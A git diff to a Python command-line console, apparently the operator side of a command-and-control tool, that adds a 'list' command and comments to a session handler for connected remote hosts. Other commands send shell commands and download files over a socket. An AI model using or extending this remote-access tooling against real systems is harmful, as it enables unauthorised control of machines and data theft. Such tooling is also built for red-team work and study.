@@ -8,11 +8,13 @@ class SandwormCLI(cmd.Cmd):
     def __init__(self, index, sandworm, parent_cli):
         super().__init__()
         self.index = index
-        self.sandworm = sandworm
-        self.parent_cli = parent_cli
+        self.sandworm = sandworm # Dictionary with attributes Socket, hostname, username and tcp_listener_index
+        self.parent_cli = parent_cli # arakis CLI
         self.prompt = f"(🐍 Sandworm [{index}:{sandworm["username"]}])> "
 
 
+    # On override le emptyline pour que quand on rentre "enter" sans aucune commande
+    # ca exécute automatiquement la dernière commande lancée
     def emptyline(self):
         """
         Override emptyline to prevent repeating the last command.
@@ -35,6 +37,20 @@ class SandwormCLI(cmd.Cmd):
         self.sandworm["socket"].send(sent_command.encode() + b"\n")
 
         print(f"Sent command to Sandworm [{self.index}]: {command}")
+
+
+    def do_list(self,  arg):
+        """
+        List files from remote's client directory
+        Usage: list
+
+        TODO : Add path option
+        """
+        tcp_server = self.parent_cli.tcp_listeners[self.sandworm["tcp_index"]][0]
+
+        files = tcp_server.get_listing(self.sandworm["socket"])
+        print(f"\nFiles from client [{self.index}]:\n{files}")
+        return
 
 
     def do_download(self, file_path):
@@ -70,7 +86,8 @@ class SandwormCLI(cmd.Cmd):
         else:
             print("\nAvailable Commands:")
             print("  help                   - tcp help message")
-            print("  download <file_path>   - Start an existing TCP listener")
+            print("  download <file_path>   - download file <file_path>")
+            print("  list                   - List remote files")
             print("  exec <command>         - Remove a TCP listener")
             print("  exit                   - Exit the CLI\n")
 
